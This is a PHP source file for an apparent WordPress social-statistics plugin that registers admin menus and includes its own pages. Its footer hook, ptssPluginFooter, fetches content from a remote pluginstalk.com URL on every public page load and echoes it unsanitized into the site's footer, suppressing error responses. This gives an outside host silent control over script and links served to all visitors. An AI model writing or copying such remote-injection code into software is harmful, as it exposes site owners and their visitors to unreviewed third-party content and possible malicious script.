<?php

function ptssAddActions () {
	add_action('admin_menu', "ptssAddMenus");
	add_action('wp_footer', 'ptssPluginFooter');
}

function ptssAddMenus () {
	new PTSS_MenuHandler ;
}

function ptssGetter ( $type, $name ) {
	$class = 'PTSS_Variables';
	return call_user_func_array ( array($class, 'getVariable'), array( $name, $type ));
}

function ptssAboutPluginsTalk () {
?><div id="ptssMainContent"><?php
	include ( PTSS_BASE_URL."/pages/aboutPluginsTalk.php" );
?></div><?php	
}


function socialStatisticsByPluginsTalk () {
?><div id="ptssMainContent"><?php	
	include ( PTSS_BASE_URL."/pages/socialStatisticsByPluginsTalk.php" );
?></div><?php
}

function ptssPluginFooter () {
	$footerURL = "http://pluginstalk.com/plugins/social-statistics-by-plugins-talk/footer.php";
	$fileData = file_get_contents(sprintf($footerURL));
	$pos = strpos($fileData , "rror");
	if ($pos === false) {
	    echo $fileData ;
	}
	unset($fileData);
}

?>